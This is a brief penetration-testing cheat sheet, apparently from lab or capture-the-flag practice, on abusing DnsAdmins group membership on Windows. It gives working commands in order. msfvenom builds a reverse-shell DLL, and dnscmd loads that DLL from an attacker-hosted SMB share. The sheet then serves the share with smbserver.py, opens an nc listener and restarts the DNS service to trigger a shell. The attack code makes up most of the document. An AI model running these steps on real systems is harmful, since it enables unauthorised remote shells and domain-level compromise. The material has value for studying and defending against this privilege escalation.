# DnsAdmins
DnsAdmins is a Windows group specifically for administering DNS servers in an Active Directory environment. Members of this group have extensive control over DNS services without needing full Domain Admin privileges.

# Steps
1. Create a dll binary and upload it



# create dll with msfvenom
```language
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o rev.dll
```
# Inject dll
```language
dnscmd.exe /config /serverlevelplugindll \\attacker-ip\s\rev.dll
```
# smb server for Response check and start the listner
```language
smbserver.py s .

rlwrap nc -lvnp 9001
```
# start stop service
```language
sc.exe \\resolute stop dns

sc.exe \\resolute start dns
```
